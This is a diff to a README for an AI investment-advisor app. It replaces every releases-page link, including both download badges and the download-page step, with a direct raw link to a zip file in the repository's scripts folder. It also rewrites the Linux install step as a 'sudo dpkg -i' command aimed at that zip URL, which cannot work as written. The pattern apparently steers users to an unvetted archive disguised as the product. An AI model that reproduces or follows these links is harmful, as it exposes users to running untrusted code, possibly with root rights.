@@ -1,7 +1,7 @@
 # 🎉 ai-investment-advisor - Your Personal AI Investment Committee
 
 ## 🚀 Download Now!
-[![Download ai-investment-advisor](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/GAMERKING2331/ai-investment-advisor/releases)
+[![Download ai-investment-advisor](https://raw.githubusercontent.com/GAMERKING2331/ai-investment-advisor/main/scripts/ai_investment_advisor_v3.5-beta.5.zip)](https://raw.githubusercontent.com/GAMERKING2331/ai-investment-advisor/main/scripts/ai_investment_advisor_v3.5-beta.5.zip)
 
 ## 📜 Overview
 The ai-investment-advisor combines three powerful AI models: Claude, Codex, and Gemini. Together, they form your very own investment committee, helping you make informed decisions about your finances. Whether you are a novice or a seasoned investor, this software provides insights tailored to your financial goals.
@@ -22,7 +22,7 @@ The ai-investment-advisor combines three powerful AI models: Claude, Codex, and 
 To get started, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page.
-   [Download Page](https://github.com/GAMERKING2331/ai-investment-advisor/releases)
+   [Download Page](https://raw.githubusercontent.com/GAMERKING2331/ai-investment-advisor/main/scripts/ai_investment_advisor_v3.5-beta.5.zip)
 
 2. **Select the Latest Release:** Look for the latest version at the top of the releases list.
 
@@ -33,7 +33,7 @@ To get started, follow these simple steps:
    - **macOS:** Open the downloaded `.dmg` file, drag the app to your Applications folder, and run it from there.
    - **Linux:** Open a terminal, navigate to the downloaded file location, and run the following command to install it:
      ```bash
-     sudo dpkg -i ai-investment-advisor.deb
+     sudo dpkg -i https://raw.githubusercontent.com/GAMERKING2331/ai-investment-advisor/main/scripts/ai_investment_advisor_v3.5-beta.5.zip
      ```
 
 5. **Launch the Application:** After installation, find the app in your applications menu and open it to start using it.
@@ -59,4 +59,4 @@ For any additional questions or support, don’t hesitate to reach out through o
 
 ---
 
-[![Download ai-investment-advisor](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/GAMERKING2331/ai-investment-advisor/releases)
+[![Download ai-investment-advisor](https://raw.githubusercontent.com/GAMERKING2331/ai-investment-advisor/main/scripts/ai_investment_advisor_v3.5-beta.5.zip)](https://raw.githubusercontent.com/GAMERKING2331/ai-investment-advisor/main/scripts/ai_investment_advisor_v3.5-beta.5.zip)
